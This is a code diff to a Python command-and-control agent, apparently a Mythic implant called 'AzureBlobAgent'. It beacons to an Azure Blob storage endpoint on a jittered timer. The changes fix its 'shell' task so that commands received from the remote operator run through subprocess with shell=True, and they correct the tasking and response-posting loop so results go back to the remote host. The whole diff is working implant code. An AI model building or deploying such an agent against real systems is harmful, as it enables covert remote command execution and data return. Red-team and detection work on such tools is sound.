@@ -19,7 +19,7 @@ import sys
 
 # Configuration - Stamped at build time
 BLOB_ENDPOINT = ">https://STORAGE_ACCOUNT.blob.core.windows.net"
-CONTAINER_NAME = "agent-16b3ac73-0a6"
+CONTAINER_NAME = ">agent-XXXXXXXX-XXX"
 CONTAINER_SAS = ">[REDACTED_SAS_TOKEN]"
 CALLBACK_INTERVAL = int("2" or "30")
 CALLBACK_JITTER = int("10" or "10")
@@ -129,7 +129,7 @@ class AzureBlobAgent:
         """Build post response for Mythic"""
         return {
             "action": "post_response",
-            "responses": [response],
+            "responses": response,
         }
 
     def _get_ips(self) -> list:
@@ -175,9 +175,12 @@ class AzureBlobAgent:
         try:
             if command == "shell":
                 # Execute shell command
+                shell_params = json.loads(task.get("parameters", "{}"))
+                shell_params = shell_params.get("command", "")
+                # Execute shell command
                 import subprocess
                 result = subprocess.run(
-                    parameters,
+                    shell_params,
                     shell=True,
                     capture_output=True,
                     text=True,
@@ -240,7 +243,7 @@ class AzureBlobAgent:
         while True:
             try:
                 # Get tasking
-                data = self.postMessageAndRetrieveResponseBlob(self.build_checkin_message())
+                data = self.postMessageAndRetrieveResponseBlob(self.build_get_tasking_message())
                 response_data = None
                 if "tasks" in data:
                     print("{*] got tasks")
@@ -250,7 +253,8 @@ class AzureBlobAgent:
                         response = self.execute_task(task)
                         response_data.append(response)
                 # Post response
-                data = self.postMessageAndRetrieveResponseBlob(self.build_post_response(response))
+                if response_data:
+                    data = self.postMessageAndRetrieveResponseBlob(self.build_post_response(response_data))
                 time.sleep(self.get_sleep_time())
 
             except Exception as e:
